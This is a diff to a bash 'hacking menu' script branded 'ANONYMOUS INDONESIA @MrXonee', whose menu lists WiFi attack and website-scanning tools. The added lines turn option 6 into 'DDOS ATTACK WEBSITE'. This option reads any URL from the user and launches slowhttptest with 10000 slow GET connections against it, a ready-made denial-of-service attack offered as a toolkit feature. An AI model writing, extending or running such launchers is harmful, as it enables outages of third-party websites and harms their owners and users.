@@ -25,7 +25,7 @@ echo "$2[2]─>>CONTROL NETWORK WIFI EVILLIMITER" | lolcat
 echo "$3[3]─>>PENETRATION TESTING WIFI FLUXION" | lolcat
 echo "$4[4]─>>VULNERABILITY SCANNING WEBSITE REDHAWK" | lolcat
 echo "$5[5]─>>DDOS ATTACK WIFI" | lolcat
-echo "$6[6]─>>" | lolcat
+echo "$6[6]─>>DDOS ATTACK WEBSITE" | lolcat
 echo "$7[7]─>>" | lolcat
 echo "$8[8]─>>" | lolcat
 echo "$9[9]─>>EXIT" | lolcat
@@ -152,9 +152,14 @@ sleep 2
 echo "##################################################################################"
 toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
 echo "**********************************************************************************"
-echo "[!]" | lolcat
+echo "[!]RUNNING TOOLS DDOS ATTACK WEBSITE" | lolcat
 echo "##################################################################################"
 sleep 5
+echo "╭─[Masukan URL Website]" | lolcat
+read "╰─>> " url
+if [ $url ]
+then
+slowhttptest -c 10000 -H -g -o slowhttp -i 10 -r 200 -t GET -u $url
 fi
 
 if [ $pil = 7 ]
